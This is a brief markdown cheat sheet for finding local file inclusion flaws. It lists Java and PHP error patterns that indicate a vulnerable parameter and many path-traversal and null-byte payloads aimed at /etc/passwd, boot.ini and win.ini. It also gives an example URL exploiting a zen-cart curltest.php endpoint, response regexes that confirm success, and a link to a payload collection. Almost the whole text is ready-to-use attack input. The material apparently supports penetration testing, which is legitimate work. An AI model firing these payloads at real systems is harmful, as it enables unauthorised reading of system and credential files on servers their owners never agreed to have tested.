### LFI 

#### Errors:
```
Detect Payload: abc.txt
```

##### Java Errors:
```
java\.io\.FileNotFoundException|java\.lang\.Exception|java\.lang\.IllegalArgumentException|java\.net\.MalformedURLException
```
##### PHP Errors:
```
Warning: include\(|Warning: unlink\(|for inclusion \(include_path=|fread\(|Failed opening required|Warning: file_get_contents\(|Fatal error: require_once\(|Warning: file_exists\(
```

##### Unix Payloads:
```
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
../../../../../../../../../../../../../../../etc/passwd
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
/etc/passwd
```

another type of LFI http://website/zen-cart/extras/curltest.php?url=file:///etc/passwd
```
file:///etc/passwd
/etc/passwd%00
/etc/passwd%00.html
/etc/passwd%00.ext
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext
```

##### Windows Payloads:
```
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
../../../../../../../../../../../../../../../boot.ini
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
C:\\boot.ini
C:\\boot.ini%00
C:\\boot.ini%00.html
%SYSTEMROOT%\\win.ini
%SYSTEMROOT%\\win.ini%00
%SYSTEMROOT%\\win.ini%00.html
file:///C:/boot.ini
file:///C:/win.ini
C:\\boot.ini%00.ext
%SYSTEMROOT%\\win.ini%00.ext
```
search in response 
##### Regexp:
```
root:|for 16-bit app support|boot loader
```
Payloads:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders



